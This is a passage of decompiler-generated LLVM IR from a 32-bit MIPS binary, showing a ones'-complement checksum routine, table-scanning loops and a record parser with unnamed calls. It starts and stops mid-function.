  %v2_40038c = add i32 %v2_400384, %v4_40037c
  br label %dec_label_pc_40039c

dec_label_pc_40039c:                              ; preds = %dec_label_pc_40039c, %dec_label_pc_400370
  %v1_4003a02 = phi i32 [ %v1_4003a0, %dec_label_pc_40039c ], [ %v2_40038c, %dec_label_pc_400370 ]
  %v3_4003a41 = phi i32 [ %v3_4003a4, %dec_label_pc_40039c ], [ %v1_400378, %dec_label_pc_400370 ]
  %v2_40039c = add i32 %v3_4003a41, %v1_4003a02
  %v1_4003a0 = udiv i32 %v2_40039c, 65536
  %tmp = icmp ult i32 %v2_40039c, 65536
  %v3_4003a4 = urem i32 %v2_40039c, 65536
  br i1 %tmp, label %dec_label_pc_4003a8, label %dec_label_pc_40039c

dec_label_pc_4003a8:                              ; preds = %dec_label_pc_40039c
  %v2_4003b0 = xor i32 %v3_4003a4, 65535
  ret i32 %v2_4003b0

; uselistorder directives
  uselistorder i32 %v3_4003a4, { 1, 0 }
  uselistorder i32 %v2_40039c, { 2, 0, 1 }
  uselistorder i32 %v2_40034c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_400370, { 1, 0 }
}

define i32 @function_4003b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4003b8:
  %v1_4003c4 = urem i32 %arg1, 256
  %v1_4003c8 = urem i32 %arg3, 256
  %v1_4003cc = add i32 %arg2, 4
  br label %dec_label_pc_4003dc

dec_label_pc_4003dc:                              ; preds = %dec_label_pc_4003f0, %dec_label_pc_4003b8
  %v0_4004005 = phi i32 [ %v0_400400, %dec_label_pc_4003f0 ], [ 0, %dec_label_pc_4003b8 ]
  %v0_4003f4 = phi i32 [ %v3_4003f8, %dec_label_pc_4003f0 ], [ 0, %dec_label_pc_4003b8 ]
  %v0_4003f0 = phi i32 [ %v1_4003f0, %dec_label_pc_4003f0 ], [ %v1_4003cc, %dec_label_pc_4003b8 ]
  %v1_4003dc = inttoptr i32 %v0_4003f0 to i8*
  %v2_4003dc = load i8, i8* %v1_4003dc, align 1
  %v3_4003dc = zext i8 %v2_4003dc to i32
  %v2_4003e4 = icmp eq i32 %v3_4003dc, %v1_4003c8
  br i1 %v2_4003e4, label %dec_label_pc_4003e8, label %dec_label_pc_4003f0

dec_label_pc_4003e8:                              ; preds = %dec_label_pc_4003dc
  %v1_4003ec = add i32 %v0_4003f0, -4
  %v2_4003ec = inttoptr i32 %v1_4003ec to i32*
  %v3_4003ec = load i32, i32* %v2_4003ec, align 4
  br label %dec_label_pc_4003f0

dec_label_pc_4003f0:                              ; preds = %dec_label_pc_4003dc, %dec_label_pc_4003e8
  %v0_400400 = phi i32 [ %v0_4004005, %dec_label_pc_4003dc ], [ %v3_4003ec, %dec_label_pc_4003e8 ]
  %v1_4003f0 = add i32 %v0_4003f0, 8
  %v2_4003f4 = icmp slt i32 %v0_4003f4, %v1_4003c4
  %v3_4003f8 = add nuw nsw i32 %v0_4003f4, 1
  br i1 %v2_4003f4, label %dec_label_pc_4003dc, label %dec_label_pc_4003fc

dec_label_pc_4003fc:                              ; preds = %dec_label_pc_4003f0
  %v1_400400 = icmp eq i32 %v0_400400, 0
  br i1 %v1_400400, label %dec_label_pc_400418, label %dec_label_pc_400404

dec_label_pc_400404:                              ; preds = %dec_label_pc_4003fc
  %v3_400410 = call i32 @function_404464(i64 10)
  br label %dec_label_pc_400418

dec_label_pc_400418:                              ; preds = %dec_label_pc_4003fc, %dec_label_pc_400404
  ret i32 %arg4

; uselistorder directives
  uselistorder i32 %v0_4003f4, { 1, 0 }
  uselistorder label %dec_label_pc_400418, { 1, 0 }
  uselistorder label %dec_label_pc_4003f0, { 1, 0 }
}

define i32 @function_400420(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_400420:
  %s4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  store i32 %arg1, i32* %s4.global-to-local, align 4
  %v1_40045c = urem i32 %arg2, 256
  store i32 %v1_40045c, i32* @s1, align 4
  %v1_400460 = urem i32 %arg3, 256
  store i32 %v1_400460, i32* @s2, align 4
  %v4_400464 = zext i8 %arg5 to i32
  store i32 %v4_400464, i32* @s3, align 4
  store i32 -1, i32* @s0, align 4
  %v1_400468 = call i32 @unknown_0()
  %v1_400474 = load i32, i32* @s0, align 4
  %v2_400474 = icmp eq i32 %v1_400468, %v1_400474
  %v1_40047c = icmp sgt i32 %v1_400468, 0
  %or.cond = or i1 %v1_40047c, %v2_400474
  br i1 %or.cond, label %dec_label_pc_400560, label %dec_label_pc_400480

dec_label_pc_400480:                              ; preds = %dec_label_pc_400420
  %v3_400484 = load i32, i32* @global_var_449380.4, align 4
  store i32 %v3_400484, i32* @t9, align 4
  %v1_40048c = call i32 @function_404a30()
  store i32 %v1_40048c, i32* @v0, align 4
  %v1_400498 = load i32, i32* @s0, align 4
  %v2_400498 = icmp eq i32 %v1_40048c, %v1_400498
  br i1 %v2_400498, label %dec_label_pc_4004f0, label %dec_label_pc_40049c

dec_label_pc_40049c:                              ; preds = %dec_label_pc_400480
  %v1_4004a0 = icmp eq i32 %v1_40048c, 0
  br i1 %v1_4004a0, label %dec_label_pc_4004a4, label %dec_label_pc_40051c

dec_label_pc_4004a4:                              ; preds = %dec_label_pc_40049c
  %v3_4004a8 = load i32, i32* @global_var_449454.5, align 4
  store i32 %v3_4004a8, i32* @t9, align 4
  %v1_4004b0 = load i32, i32* %s4.global-to-local, align 4
  %v3_4004b0 = call i32 @function_406440(i32 %v1_4004b0)
  %v3_4004c0 = load i32, i32* @global_var_449348.6, align 4
  store i32 %v3_4004c0, i32* @t9, align 4
  %v1_4004c8 = call i32 @function_404af0()
  %v3_4004d8 = load i32, i32* @global_var_4493e4.7, align 4
  store i32 %v3_4004d8, i32* @t9, align 4
  %v3_4004e0 = call i32 @function_404b50(i32 %v1_4004c8, i32 9)
  store i32 %v3_4004e0, i32* @v0, align 4
  br label %dec_label_pc_4004f0

dec_label_pc_4004f0:                              ; preds = %dec_label_pc_400480, %dec_label_pc_4004a4
  %v3_4004f0 = load i32, i32* @global_var_4492dc.8, align 4
  store i32 %v3_4004f0, i32* @t9, align 4
  %v2_4004f8 = call i32 @function_406350(i32 0)
  br label %dec_label_pc_400500

dec_label_pc_400500:                              ; preds = %dec_label_pc_40053c, %dec_label_pc_4004f0
  %v0_400500 = phi i32 [ %v2_4004f8, %dec_label_pc_4004f0 ], [ %v0_400548, %dec_label_pc_40053c ]
  %v1_400500 = inttoptr i32 %v0_400500 to i32*
  %v2_400500 = load i32, i32* %v1_400500, align 4
  call void @__pseudo_call(i32 %v2_400500)
  br label %dec_label_pc_40051c

dec_label_pc_40051c:                              ; preds = %dec_label_pc_40049c, %dec_label_pc_400500
  %v3_400524 = load i32, i32* @global_var_449500.11, align 4
  %v0_40052c = load i32, i32* @s1, align 4
  %v1_40052c = urem i32 %v0_40052c, 256
  br label %dec_label_pc_400530

dec_label_pc_400530:                              ; preds = %dec_label_pc_400548, %dec_label_pc_40051c
  %v0_400548 = phi i32 [ %v3_400548, %dec_label_pc_400548 ], [ %v3_400524, %dec_label_pc_40051c ]
  %v1_400530 = add i32 %v0_400548, 4
  %v2_400530 = inttoptr i32 %v1_400530 to i8*
  %v3_400530 = load i8, i8* %v2_400530, align 1
  %v1_400538 = icmp eq i8 %v3_400530, 0
  br i1 %v1_400538, label %dec_label_pc_400548, label %dec_label_pc_40053c

dec_label_pc_40053c:                              ; preds = %dec_label_pc_400530
  %v4_400530 = zext i8 %v3_400530 to i32
  %v2_400540 = icmp eq i32 %v1_40052c, %v4_400530
  br i1 %v2_400540, label %dec_label_pc_400500, label %dec_label_pc_400548

dec_label_pc_400548:                              ; preds = %dec_label_pc_40053c, %dec_label_pc_400530
  %v1_400548 = add i32 %v0_400548, 8
  %v2_400548 = inttoptr i32 %v1_400548 to i32*
  %v3_400548 = load i32, i32* %v2_400548, align 4
  %v1_400550 = icmp eq i32 %v3_400548, 0
  br i1 %v1_400550, label %dec_label_pc_400560, label %dec_label_pc_400530

dec_label_pc_400560:                              ; preds = %dec_label_pc_400548, %dec_label_pc_400420
  %v4_40057c = phi i32 [ %v1_400468, %dec_label_pc_400420 ], [ 0, %dec_label_pc_400548 ]
  ret i32 %v4_40057c

; uselistorder directives
  uselistorder i32 %v3_400548, { 1, 0 }
  uselistorder i8 %v3_400530, { 1, 0 }
  uselistorder i32 %v0_400548, { 1, 2, 0 }
  uselistorder label %dec_label_pc_40051c, { 1, 0 }
  uselistorder label %dec_label_pc_4004f0, { 1, 0 }
}

define i32 @function_400584(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_400584:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_40058c = load i32, i32* @t9, align 4
  store i32 %tmp, i32* @s2, align 4
  %v1_4005b0 = icmp eq i32 %arg2, 0
  store i32 %arg3, i32* %s3.global-to-local, align 4
  br i1 %v1_4005b0, label %dec_label_pc_4005cc, label %dec_label_pc_4005b4

dec_label_pc_4005b4:                              ; preds = %dec_label_pc_400584
  %v3_4005b8 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_4005b8, i32* @t9, align 4
  %v3_4005c0 = call i32 @function_405f40(i32 %arg2)
  %v0_4005cc.pre = load i32, i32* @s2, align 4
  br label %dec_label_pc_4005cc

dec_label_pc_4005cc:                              ; preds = %dec_label_pc_400584, %dec_label_pc_4005b4
  %v0_4005cc = phi i32 [ %tmp, %dec_label_pc_400584 ], [ %v0_4005cc.pre, %dec_label_pc_4005b4 ]
  store i32 %v0_4005cc, i32* %s0.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  %v1_4005f8 = add i32 %v1_40058c, 298240
  %v2_4005f8 = inttoptr i32 %v1_4005f8 to i32*
  br label %dec_label_pc_4005d8

dec_label_pc_4005d8:                              ; preds = %dec_label_pc_4005f4.dec_label_pc_4005d8_crit_edge, %dec_label_pc_4005cc
  %v0_4005f43 = phi i32 [ %v3_4005fc, %dec_label_pc_4005f4.dec_label_pc_4005d8_crit_edge ], [ 0, %dec_label_pc_4005cc ]
  %v0_4005d8 = phi i32 [ %v0_4005d8.pre, %dec_label_pc_4005f4.dec_label_pc_4005d8_crit_edge ], [ %v0_4005cc, %dec_label_pc_4005cc ]
  %v1_4005d8 = inttoptr i32 %v0_4005d8 to i32*
  %v2_4005d8 = load i32, i32* %v1_4005d8, align 4
  %v1_4005dc = add i32 %v0_4005d8, 8
  store i32 %v1_4005dc, i32* %s0.global-to-local, align 4
  %v1_4005e0 = icmp eq i32 %v2_4005d8, 0
  br i1 %v1_4005e0, label %dec_label_pc_4005f4, label %dec_label_pc_4005e4

dec_label_pc_4005e4:                              ; preds = %dec_label_pc_4005d8
  %v0_4005e8 = load i32, i32* @t9, align 4
  call void @__pseudo_call(i32 %v0_4005e8)
  %v0_4005f4.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4005f4

dec_label_pc_4005f4:                              ; preds = %dec_label_pc_4005d8, %dec_label_pc_4005e4
  %v2_4005fc = phi i32 [ %v0_4005f43, %dec_label_pc_4005d8 ], [ %v0_4005f4.pre, %dec_label_pc_4005e4 ]
  %v1_4005f4 = load i32, i32* %s3.global-to-local, align 4
  %v2_4005f4 = icmp slt i32 %v2_4005fc, %v1_4005f4
  %v3_4005f8 = load i32, i32* %v2_4005f8, align 4
  store i32 %v3_4005f8, i32* @t9, align 4
  %v1_4005fc = icmp eq i1 %v2_4005f4, false
  %v3_4005fc = add i32 %v2_4005fc, 1
  store i32 %v3_4005fc, i32* %s1.global-to-local, align 4
  br i1 %v1_4005fc, label %dec_label_pc_400600, label %dec_label_pc_4005f4.dec_label_pc_4005d8_crit_edge

dec_label_pc_4005f4.dec_label_pc_4005d8_crit_edge: ; preds = %dec_label_pc_4005f4
  %v0_4005d8.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4005d8

dec_label_pc_400600:                              ; preds = %dec_label_pc_4005f4
  %v3_4005f4 = zext i1 %v2_4005f4 to i32
  call void @__pseudo_branch(i32 %v3_4005f8)
  ret i32 %v3_4005f4

; uselistorder directives
  uselistorder i32 %v3_4005fc, { 1, 0 }
  uselistorder i1 %v2_4005f4, { 1, 0 }
  uselistorder i32 %v0_4005d8, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_4005f4, { 1, 0 }
  uselistorder label %dec_label_pc_4005cc, { 1, 0 }
}

define i32 @function_400624(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_400624:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %v0_400638 = load i32, i32* @fp, align 4
  %v0_40063c = load i32, i32* @s7, align 4
  %v0_400640 = load i32, i32* @s6, align 4
  %v0_400644 = load i32, i32* @s5, align 4
  %v0_400648 = load i32, i32* @s4, align 4
  %v0_40064c = load i32, i32* @s3, align 4
  %v0_400650 = load i32, i32* @s2, align 4
  %v0_400654 = load i32, i32* @s1, align 4
  %v0_400658 = load i32, i32* @s0, align 4
  %v1_400660 = icmp ult i32 %arg2, 4
  %v2_400660 = zext i1 %v1_400660 to i32
  store i32 %v2_400660, i32* %v0.global-to-local, align 4
  store i32 %arg2, i32* %s2.global-to-local, align 4
  store i32 %tmp, i32* %s1.global-to-local, align 4
  br i1 %v1_400660, label %dec_label_pc_4006b8, label %dec_label_pc_40066c

dec_label_pc_40066c:                              ; preds = %dec_label_pc_400624
  %v2_400670 = load i32, i32* %arg1, align 4
  store i32 %v2_400670, i32* %v1.global-to-local, align 4
  %v1_400674 = add i32 %arg2, -4
  store i32 %v1_400674, i32* %v0.global-to-local, align 4
  %v1_400678 = icmp eq i32 %v1_400674, 0
  br i1 %v1_400678, label %dec_label_pc_4006b8, label %dec_label_pc_40067c

dec_label_pc_40067c:                              ; preds = %dec_label_pc_40066c
  %v1_400680 = add i32 %tmp, 4
  %v2_400680 = inttoptr i32 %v1_400680 to i8*
  %v3_400680 = load i8, i8* %v2_400680, align 1
  %v4_400680 = sext i8 %v3_400680 to i32
  store i32 %v4_400680, i32* %v1.global-to-local, align 4
  %v1_400684 = add i32 %arg2, -5
  store i32 %v1_400684, i32* %v0.global-to-local, align 4
  %v1_400688 = icmp eq i32 %v1_400684, 0
  br i1 %v1_400688, label %dec_label_pc_4006b8, label %dec_label_pc_40068c

dec_label_pc_40068c:                              ; preds = %dec_label_pc_40067c
  %v1_400690 = add i32 %tmp, 5
  %v2_400690 = inttoptr i32 %v1_400690 to i8*
  %v3_400690 = load i8, i8* %v2_400690, align 1
  %v4_400690 = sext i8 %v3_400690 to i32
  store i32 %v4_400690, i32* %v1.global-to-local, align 4
  %v1_400698 = icmp eq i8 %v3_400690, 0
  %v3_400698 = urem i32 %v4_400690, 256
  store i32 %v3_400698, i32* @s7, align 4
  br i1 %v1_400698, label %dec_label_pc_4006b8, label %dec_label_pc_40069c

dec_label_pc_40069c:                              ; preds = %dec_label_pc_40068c
  %v2_4006a4 = mul nuw nsw i32 %v3_400698, 5
  store i32 %v2_4006a4, i32* %v1.global-to-local, align 4
  %v1_4006a8 = add i32 %arg2, -6
  %v2_4006ac = icmp ult i32 %v1_4006a8, %v2_4006a4
  %v3_4006ac = zext i1 %v2_4006ac to i32
  store i32 %v3_4006ac, i32* %v0.global-to-local, align 4
  %v1_4006b0 = icmp eq i1 %v2_4006ac, false
  br i1 %v1_4006b0, label %dec_label_pc_4006c0, label %dec_label_pc_4006b8

dec_label_pc_4006b8:                              ; preds = %dec_label_pc_40069c, %dec_label_pc_40068c, %dec_label_pc_40067c, %dec_label_pc_40066c, %dec_label_pc_400624
  %v0_4006c46 = phi i32 [ %v0_40063c, %dec_label_pc_400624 ], [ %v0_40063c, %dec_label_pc_40066c ], [ %v0_40063c, %dec_label_pc_40067c ], [ %v3_400698, %dec_label_pc_40068c ], [ %v3_400698, %dec_label_pc_40069c ]
  %.03 = phi i32 [ undef, %dec_label_pc_400624 ], [ %v2_400670, %dec_label_pc_40066c ], [ %v2_400670, %dec_label_pc_40067c ], [ %v2_400670, %dec_label_pc_40068c ], [ %v2_400670, %dec_label_pc_40069c ]
  %.02 = phi i32 [ undef, %dec_label_pc_400624 ], [ undef, %dec_label_pc_40066c ], [ %v4_400680, %dec_label_pc_40067c ], [ %v4_400680, %dec_label_pc_40068c ], [ %v4_400680, %dec_label_pc_40069c ]
  store i32 %v0_400658, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4006c0

dec_label_pc_4006c0:                              ; preds = %dec_label_pc_40069c, %dec_label_pc_4006b8
  %v0_4006c4 = phi i32 [ %v0_4006c46, %dec_label_pc_4006b8 ], [ %v3_400698, %dec_label_pc_40069c ]
  %.14 = phi i32 [ %.03, %dec_label_pc_4006b8 ], [ %v2_400670, %dec_label_pc_40069c ]
  %.1 = phi i32 [ %.02, %dec_label_pc_4006b8 ], [ %v4_400680, %dec_label_pc_40069c ]
  %v3_4006c0 = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_4006c0, i32* %t9.global-to-local, align 4
  store i32 %v0_4006c4, i32* %a0.global-to-local, align 4
  store i32 24, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4006c0)
  %v0_4006d4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4006d4, i32* %s4.global-to-local, align 4
  %v0_4006d8 = load i32, i32* %s1.global-to-local, align 4
  %v1_4006d8 = add i32 %v0_4006d8, 6
  store i32 %v1_4006d8, i32* %s0.global-to-local, align 4
  store i32 %v0_4006d4, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 2, i32* %t0.global-to-local, align 4
  %v2_4006f8.pre = load i32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_4006f0

dec_label_pc_4006f0:                              ; preds = %dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge, %dec_label_pc_4006c0
  %v2_4006f8 = phi i32 [ %v4_40071c, %dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge ], [ %v2_4006f8.pre, %dec_label_pc_4006c0 ]
  %v0_4006f8.off0 = phi i16 [ %extract.t, %dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge ], [ 2, %dec_label_pc_4006c0 ]
  %v0_4006f0 = phi i32 [ %v0_4006f0.pre, %dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge ], [ %v1_4006d8, %dec_label_pc_4006c0 ]
  %v1_4006f0 = add i32 %v0_4006f0, 4
  %v2_4006f0 = inttoptr i32 %v1_4006f0 to i8*
  %v3_4006f0 = load i8, i8* %v2_4006f0, align 1
  %v4_4006f0 = zext i8 %v3_4006f0 to i32
  store i32 %v4_4006f0, i32* %v1.global-to-local, align 4
  %v1_4006f4 = inttoptr i32 %v0_4006f0 to i32*
  %v2_4006f4 = load i32, i32* %v1_4006f4, align 4
  store i32 %v2_4006f4, i32* %v0.global-to-local, align 4
  %v3_4006f8 = add i32 %v2_4006f8, -24
  %v4_4006f8 = inttoptr i32 %v3_4006f8 to i16*
  store i16 %v0_4006f8.off0, i16* %v4_4006f8, align 2
  %v0_4006fc = load i32, i32* %s0.global-to-local, align 4
  %v1_4006fc = add i32 %v0_4006fc, 5
  store i32 %v1_4006fc, i32* %s0.global-to-local, align 4
  %v0_400700 = load i32, i32* %v0.global-to-local, align 4
  %v1_400700 = load i32, i32* %a1.global-to-local, align 4
  %v2_400700 = add i32 %v1_400700, -20
  %v3_400700 = inttoptr i32 %v2_400700 to i32*
  store i32 %v0_400700, i32* %v3_400700, align 4
  %v0_400704 = load i32, i32* %v1.global-to-local, align 4
  %v1_400704 = trunc i32 %v0_400704 to i8
  %v2_400704 = load i32, i32* %a0.global-to-local, align 4
  %v3_400704 = add i32 %v2_400704, -4
  %v4_400704 = inttoptr i32 %v3_400704 to i8*
  store i8 %v1_400704, i8* %v4_400704, align 1
  %v0_400708 = load i32, i32* %v0.global-to-local, align 4
  %v1_400708 = load i32, i32* %a0.global-to-local, align 4
  %v2_400708 = add i32 %v1_400708, -8
  %v3_400708 = inttoptr i32 %v2_400708 to i32*
  store i32 %v0_400708, i32* %v3_400708, align 4
  %v0_40070c = load i32, i32* %a3.global-to-local, align 4
  %v1_40070c = load i32, i32* @s7, align 4
  %v2_40070c = icmp slt i32 %v0_40070c, %v1_40070c
  %v3_40070c = zext i1 %v2_40070c to i32
  store i32 %v3_40070c, i32* %v0.global-to-local, align 4
  %v0_400710 = load i32, i32* %a2.global-to-local, align 4
  %v1_400710 = add i32 %v0_400710, 24
  store i32 %v1_400710, i32* %a2.global-to-local, align 4
  %v1_400714 = add i32 %v0_40070c, 1
  store i32 %v1_400714, i32* %a3.global-to-local, align 4
  %v0_400718 = load i32, i32* %a0.global-to-local, align 4
  %v1_400718 = add i32 %v0_400718, 24
  store i32 %v1_400718, i32* %a0.global-to-local, align 4
  %v1_40071c = icmp eq i1 %v2_40070c, false
  %v2_40071c = load i32, i32* %s4.global-to-local, align 4
  %v4_40071c = add i32 %v2_40071c, %v1_400710
  store i32 %v4_40071c, i32* %a1.global-to-local, align 4
  br i1 %v1_40071c, label %dec_label_pc_400720, label %dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge

dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge: ; preds = %dec_label_pc_4006f0
  %v0_4006f0.pre = load i32, i32* %s0.global-to-local, align 4
  %v0_4006f8.pre = load i32, i32* %t0.global-to-local, align 4
  %extract.t = trunc i32 %v0_4006f8.pre to i16
  br label %dec_label_pc_4006f0

dec_label_pc_400720:                              ; preds = %dec_label_pc_4006f0
  %v0_400724 = load i32, i32* %s2.global-to-local, align 4
  %v1_400724 = load i32, i32* %s1.global-to-local, align 4
  %v2_400724 = add i32 %v1_400724, %v0_400724
  %v1_400728 = load i32, i32* %s0.global-to-local, align 4
  %v2_400728 = sub i32 %v2_400724, %v1_400728
  store i32 %v2_400728, i32* %v0.global-to-local, align 4
  %v1_40072c = icmp eq i32 %v2_400728, 0
  store i32 %v1_400728, i32* %a0.global-to-local, align 4
  br i1 %v1_40072c, label %dec_label_pc_400730, label %dec_label_pc_400740

dec_label_pc_400730:                              ; preds = %dec_label_pc_400720
  store i32 %v2_40071c, i32* %a1.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400740

dec_label_pc_400740:                              ; preds = %dec_label_pc_400720, %dec_label_pc_400730
  %v1_400740 = inttoptr i32 %v1_400728 to i8*
  %v2_400740 = load i8, i8* %v1_400740, align 1
  %v3_400740 = zext i8 %v2_400740 to i32
  store i32 %v3_400740, i32* %s6.global-to-local, align 4
  %v3_400744 = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_400744, i32* %t9.global-to-local, align 4
  store i32 %v3_400740, i32* %a0.global-to-local, align 4
  store i32 8, i32* %a1.global-to-local, align 4
  %v2_400750 = add i32 %v2_400728, -1
  store i32 %v2_400750, i32* %s1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400744)
  %v0_40075c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_40075c, i32* %s5.global-to-local, align 4
  %v0_400760 = load i32, i32* %s0.global-to-local, align 4
  %v1_400760 = add i32 %v0_400760, 1
  store i32 %v1_400760, i32* %s2.global-to-local, align 4
  store i32 %v0_40075c, i32* %s3.global-to-local, align 4
  %v0_400770.pr = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_400770

dec_label_pc_400770:                              ; preds = %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge, %dec_label_pc_400740
  %v0_400778 = phi i32 [ %v0_400834, %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge ], [ %v1_400760, %dec_label_pc_400740 ]
  %v2_400770 = phi i32 [ %v2_400770.pre, %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge ], [ %v0_40075c, %dec_label_pc_400740 ]
  %v0_400770 = phi i32 [ %v2_400810, %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge ], [ %v0_400770.pr, %dec_label_pc_400740 ]
  %.01 = phi i32 [ %v1_400828, %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge ], [ 0, %dec_label_pc_400740 ]
  %.0 = phi i32 [ %v1_400814, %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge ], [ undef, %dec_label_pc_400740 ]
  %v1_400770 = icmp eq i32 %v0_400770, 0
  store i32 %v2_400770, i32* %a0.global-to-local, align 4
  br i1 %v1_400770, label %dec_label_pc_4007a4, label %dec_label_pc_400774

dec_label_pc_400774:                              ; preds = %dec_label_pc_400770
  %v1_400778 = inttoptr i32 %v0_400778 to i8*
  %v2_400778 = load i8, i8* %v1_400778, align 1
  %v3_400778 = zext i8 %v2_400778 to i32
  store i32 %v3_400778, i32* %v0.global-to-local, align 4
  %v0_40077c = load i32, i32* %v1.global-to-local, align 4
  %v1_40077c = icmp eq i32 %v0_40077c, 0
  %v4_40077c = load i32, i32* %s3.global-to-local, align 4
  %v5_40077c = add i32 %v4_40077c, 4
  %v6_40077c = inttoptr i32 %v5_40077c to i8*
  store i8 %v2_400778, i8* %v6_40077c, align 1
  br i1 %v1_40077c, label %dec_label_pc_4007a4, label %dec_label_pc_400780

dec_label_pc_400780:                              ; preds = %dec_label_pc_400774
  %v0_400784 = load i32, i32* %s2.global-to-local, align 4
  %v1_400784 = add i32 %v0_400784, 1
  %v2_400784 = inttoptr i32 %v1_400784 to i8*
  %v3_400784 = load i8, i8* %v2_400784, align 1
  %v4_400784 = zext i8 %v3_400784 to i32
  store i32 %v4_400784, i32* %s0.global-to-local, align 4
  store i32 %.0, i32* %v1.global-to-local, align 4
  %v0_40078c = load i32, i32* %s3.global-to-local, align 4
  %v1_40078c = add i32 %v0_40078c, 8
  store i32 %v1_40078c, i32* %s3.global-to-local, align 4
  %v2_400790 = icmp slt i32 %.0, %v4_400784
  %v3_400790 = zext i1 %v2_400790 to i32
  store i32 %v3_400790, i32* %v0.global-to-local, align 4
  %v1_400794 = add nuw nsw i32 %v4_400784, 1
  store i32 %v1_400794, i32* %a0.global-to-local, align 4
  %v1_400798 = icmp eq i1 %v2_400790, false
  %v2_400798 = load i32, i32* @fp, align 4
  %v4_400798 = add i32 %v2_400798, %v4_400784
  store i32 %v4_400798, i32* %s2.global-to-local, align 4
  br i1 %v1_400798, label %dec_label_pc_4007e4, label %dec_label_pc_40079c

dec_label_pc_40079c:                              ; preds = %dec_label_pc_400780
  %v0_4007a0 = load i32, i32* %s5.global-to-local, align 4
  store i32 %v0_4007a0, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4007a4

dec_label_pc_4007a4:                              ; preds = %dec_label_pc_400774, %dec_label_pc_400770, %dec_label_pc_40079c
  %v0_4007a4 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_4007a4, i32* %a1.global-to-local, align 4
  %v0_4007a8 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v0_4007a8, i32* %a2.global-to-local, align 4
  %v3_4007ac = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  store i32 %v0_400638, i32* @fp, align 4
  store i32 %v0_40063c, i32* @s7, align 4
  store i32 %v0_400640, i32* %s6.global-to-local, align 4
  store i32 %v0_400644, i32* %s5.global-to-local, align 4
  store i32 %v0_400648, i32* %s4.global-to-local, align 4
  store i32 %v0_40064c, i32* %s3.global-to-local, align 4
  store i32 %v0_400650, i32* %s2.global-to-local, align 4
  store i32 %v0_400654, i32* %s1.global-to-local, align 4
  store i32 %v0_400658, i32* %s0.global-to-local, align 4
  %v1_4007d8 = add i32 %v3_4007ac, 1412
  store i32 %v1_4007d8, i32* %t9.global-to-local, align 4
  call void @__pseudo_branch(i32 %v1_4007d8)
  br label %dec_label_pc_4007e4

dec_label_pc_4007e4:                              ; preds = %dec_label_pc_400780, %dec_label_pc_4007a4
  %v0_4007e4 = load i32, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_4007e4)
  %v0_4007f0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4007f0, i32* %a0.global-to-local, align 4
  %v3_4007f4 = load i32, i32* @global_var_44936c.20, align 4
  store i32 %v3_4007f4, i32* %t9.global-to-local, align 4
  %v1_4007f8 = load i32, i32* %s3.global-to-local, align 4
  %v2_4007f8 = add i32 %v1_4007f8, -8
  %v3_4007f8 = inttoptr i32 %v2_4007f8 to i32*
  store i32 %v0_4007f0, i32* %v3_4007f8, align 4
  %v0_4007fc = load i32, i32* @fp, align 4
  store i32 %v0_4007fc, i32* %a1.global-to-local, align 4
  %v1_400800 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v1_400800, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4007f4)
